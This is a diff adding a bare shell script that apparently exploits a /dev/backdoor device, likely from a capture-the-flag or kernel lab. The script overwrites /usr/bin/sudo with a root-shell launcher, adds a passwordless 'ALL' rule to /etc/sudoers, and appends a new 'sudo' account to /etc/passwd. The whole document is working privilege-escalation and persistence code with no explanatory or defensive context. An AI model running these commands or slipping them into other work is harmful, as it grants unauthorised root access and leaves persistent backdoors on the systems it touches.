@@ -1,0 +1,19 @@
+
+
+echo "b4ckd00r:/usr/bin/sudo:2559" > /dev/backdoor
+echo "#!/bin/sh" > /usr/bin/sudo
+echo "id" >> /usr/bin/sudo
+echo "setsid cttyhack setuidgid 0 /bin/sh" >> /usr/bin/sudo
+echo "ls /root" >> /usr/bin/sudo
+echo "b4ckd00r:/usr/bin/sudo:2559" > /dev/backdoor
+
+
+
+echo "b4ckd00r:/etc/sudoers:2559" > /dev/backdoor
+echo "sudo  ALL=NOPASSWD: ALL" >> /etc/sudoers
+
+echo "b4ckd00r:/etc/passwd:2559" > /dev/backdoor
+echo "sudo:x:1000:1000:sudo:/:/bin/sh" >> /etc/passwd
+
+echo "b4ckd00r:/etc/sudoers:288" > /dev/backdoor
+
